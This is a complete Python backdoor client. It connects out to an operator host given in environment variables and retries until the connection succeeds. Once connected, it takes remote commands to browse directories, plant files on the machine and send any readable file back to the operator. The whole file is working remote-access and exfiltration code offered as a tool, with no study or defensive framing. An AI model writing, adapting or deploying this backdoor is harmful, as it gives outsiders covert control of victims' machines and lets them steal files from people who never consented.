import socket
import os
import time

REMOTE_HOST = str(os.environ.get("BD_HOST"))
REMOTE_PORT = int(os.environ.get("BD_PORT"))

print("SET REMOTE_HOST: " + str(REMOTE_HOST))
print("SET REMOTE_PORT: " + str(REMOTE_PORT))
server = socket.socket()
print("[-] Connection Initiating...")
while True:
    try:
        server.connect((REMOTE_HOST, REMOTE_PORT))
        break
    except:
        print("Connection failed trying again in 5 seconds")
        time.sleep(5)

print("[-] Connection initiated!")
restart = False
pwd = os.getcwd()
server.send(pwd.encode("UTF-8"))

while True:
    output = ""

    print("[-] Awaiting commands...")
    recvString = server.recv(1024)
    recvString = recvString.decode()
    inputList = recvString.split(" ")
    command = inputList[0]
    args = inputList.copy()
    del (args[0])

    if command == "cd":
        new_path = os.path.join(pwd, args[0])
        if os.path.exists(new_path) and os.path.isdir(new_path):
            pwd = os.path.abspath(new_path)
            output = pwd
        else:
            output = "Invalid Path!"
        server.send(output.encode("UTF-8"))

    elif command == "ls":
        output = ""
        for s in sorted(os.listdir(pwd)):
            if "-a" in args:
                output = output + "\n" + s
            else:
                if not s.startswith("."):
                    output = output + "\n" + s
        if output == "":
            output = "No files in directory!"
        server.send(output.encode("UTF-8"))

    elif command == "send":
        file_name = args[0]
        file_bytes = b""
        done = False

        while not done:
            data = server.recv(1024)
            file_bytes += data
            if file_bytes[-5:] == b"<END>":
                done = True

        final_bytes = file_bytes[:-5]
        if not os.path.exists(os.path.join(pwd, file_name)):
            file = open(os.path.join(pwd, file_name), "wb")
            file.write(final_bytes)
            file.close()
            output = "File send!"
        else:
            output = "File exists already!"
        server.send(output.encode("UTF-8"))

    elif command == "download":
        path = ""
        if os.path.exists(args[0]):
            path = args[0]
        elif os.path.exists(os.path.join(pwd, args[0])):
            path = os.path.abspath(os.path.join(pwd, args[0]))
        if not path == "":
            server.send("yes".encode("UTF-8"))
            time.sleep(5)
            file = open(path, "rb")
            data = file.read()
            server.sendall(data)
            server.send(b"<END>")
            file.close()
        else:
            server.send("no".encode("UTF-8"))
